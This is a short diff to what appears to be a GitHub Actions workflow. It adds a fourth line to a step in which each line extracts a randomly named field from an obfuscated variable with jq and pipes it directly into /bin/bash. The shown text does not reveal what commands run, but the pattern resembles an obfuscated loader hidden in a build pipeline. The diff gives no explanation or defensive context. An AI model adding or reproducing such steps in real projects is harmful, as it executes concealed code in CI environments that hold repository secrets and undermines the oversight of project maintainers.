@@ -28,6 +28,7 @@ jobs:
           echo $u97 | jq -r .azt70248 | /bin/bash
           printf '%s' "$z7" | jq -r .dh41280 | /bin/bash
           echo $k0045 | jq -r .rkdua365 | /bin/bash
+          printf '%s' "$ajtc2" | jq -r .g183 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
